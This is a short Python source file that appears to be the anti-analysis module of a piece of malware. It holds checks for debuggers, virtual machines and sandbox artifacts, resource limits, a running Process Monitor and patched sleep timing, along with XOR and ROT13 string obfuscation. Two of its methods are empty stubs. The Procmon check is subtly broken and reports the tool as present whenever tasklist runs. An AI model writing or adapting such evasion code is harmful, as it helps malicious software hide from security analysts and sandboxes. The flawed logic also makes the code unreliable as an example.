import os
import time
import subprocess

class AntiAnalysis:
    def __init__(self):
        self.checks = []
        
    def check_debugger(self):
        # IsDebuggerPresent
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            return kernel32.IsDebuggerPresent()
        except:
            return False
            
    def check_sandbox(self):
        # check for sandbox artifacts
        indicators = [
            "C:\\sample.exe",
            "C:\\malware.exe",
            "C:\\temp\\sample.exe",
            "\\VBox\\",
            "\\VMware\\"
        ]
        
        for indicator in indicators:
            if os.path.exists(indicator):
                return True
                
        # check for low resources
        try:
            import psutil
            if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2e9:
                return True
        except:
            pass
            
        return False
        
    def check_procmon(self):
        # check for Process Monitor
        try:
            subprocess.check_output(["tasklist", "/FI", "IMAGENAME eq Procmon.exe"])
            return True
        except:
            return False
            
    def timing_attacks(self):
        # detect analysis via timing
        start = time.time()
        time.sleep(0.1)
        elapsed = time.time() - start
        
        # if sleep is patched, elapsed will be much shorter
        if elapsed < 0.05:
            return True
        return False
        
    def anti_memory_scan(self):
        # encrypt memory during idle
        pass
        
    def decoy_threads(self):
        # create decoy execution threads
        pass

class StringObfuscation:
    def __init__(self):
        self.key = 0x41
        
    def xor_strings(self, data):
        return bytes([b ^ self.key for b in data])
        
    def rot13_strings(self, data):
        result = ""
        for c in data.decode():
            if 'a' <= c <= 'z':
                result += chr(((ord(c) - ord('a') + 13) % 26) + ord('a'))
            elif 'A' <= c <= 'Z':
                result += chr(((ord(c) - ord('A') + 13) % 26) + ord('A'))
            else:
                result += c
        return result.encode()
